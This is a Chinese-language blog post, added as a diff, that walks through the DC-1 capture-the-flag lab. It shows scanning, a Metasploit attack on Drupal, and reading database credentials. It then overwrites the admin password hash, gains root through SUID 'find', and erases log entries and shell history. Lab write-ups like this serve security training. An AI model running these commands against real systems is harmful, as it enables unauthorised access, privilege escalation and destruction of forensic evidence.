@@ -1,0 +1,139 @@
+---
+layout: post
+title: DC-1
+subtitle: DC-1
+date: 2023-07-07 14:59
+author: Kyon-H
+header-img: img/post-bg-2015.jpg
+tags:
+  - 靶场实战
+  - DC系列
+published: true
+number headings: first-level 2, max 4, 1.1., auto
+---
+
+## 1. 信息搜集
+
+### 1.1. 主机发现
+
+```shell
+arp-scan -l
+namp -T4 -A -p- 192.168.163.131 # 扫描端口
+dirb http://192.168.163.131 # 扫描目录
+whatweb -v 192.168.163.131
+```
+
+### 1.2. 渗透
+
+```shell
+msfconsole
+> search drupal
+> use <id>
+> set payload payload/...
+> set rhosts <ip>
+> options
+> run
+```
+
+#### 1.2.1. 获取 flag1
+
+![Pasted%20image%2020250707150809.png](https://img.ghostliner.top/arJvR1.png)
+
+提示查找配置文件
+
+#### 1.2.2. 获取 flag2
+
+```shell
+shell
+python -c "import pty;pty.spawn('/bin/bash')" #优化显示
+find . -name "set*" #搜索设置文件
+```
+
+![Pasted%20image%2020250707150929.png](https://img.ghostliner.top/MCGvyt.png)
+
+![Pasted%20image%2020250707151035.png](https://img.ghostliner.top/LVs8FM.png)
+
+#### 1.2.3. 获取 flag3
+
+获取到数据库信息
+
+```
+'database' => 'drupaldb',
+'username' => 'dbuser',
+'password' => 'R0ck3t',
+```
+
+```shell
+mysql -h 127.0.0.1 -P 3306 -u dbuser -pR0ck3t
+```
+
+```mysql
+use drupaldb;
+show tables;
+show columns from users;
+select * from users where uid=1;
+update users set pass="$S$DQCOKBJdDlel6L.ZfV1tYbTccflz6hwDisRxE25daht/qoX.Bb6g" where uid=1;
+```
+
+```shell
+find . -name "*.sh"
+./scripts/password-hash.sh 123
+# admin原密码 $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
+# 现密码(123) $S$DQCOKBJdDlel6L.ZfV1tYbTccflz6hwDisRxE25daht/qoX.Bb6g
+```
+
+admin 登录，搜索页面发现 flag3
+![Pasted%20image%2020250707155935.png](https://img.ghostliner.top/btkBWY.png)
+
+#### 1.2.4. 获取 flag4
+
+```shell
+cat /etc/passwd
+ls /home/flag4
+cat /home/flag4/flag4.txt
+```
+
+![Pasted%20image%2020250707151856.png](https://img.ghostliner.top/Tw3JiS.png)
+
+![Pasted%20image%2020250707151953.png](https://img.ghostliner.top/Gq0tZA.png)
+
+#### 1.2.5. 获取 flag5
+
+按提示提权
+
+```shell
+find / -perm -4000 -type f 2>/dev/null # 判断是否能提权
+find / -perm -u=s -type f  2>/dev/null
+find / -exec "/bin/bash" -p \; # 提权
+```
+
+![提权成功](https://img.ghostliner.top/tMPT5d.png)
+
+提权成功，获取 flag5
+
+![Pasted%20image%2020250707161219.png](https://img.ghostliner.top/weYUZl.png)
+
+## 2. 痕迹清除
+
+### 2.1. 网站日志清除
+
+```shell
+find /  -type f -name "access*"
+sed -i '/192.168.163.132/d' /var/log/apache2/access.log
+find /  -type f -name "error*"
+sed -i '/192.168.163.132/d' /var/log/apache2/error.log
+```
+
+### 2.2. 数据库恢复和日志清除
+
+![Pasted%20image%2020250707165639.png](https://img.ghostliner.top/rDCHQO.png)
+
+```mysql
+show global variables like "%log%";
+```
+
+### 2.3. history
+
+```shell
+history -c
+```
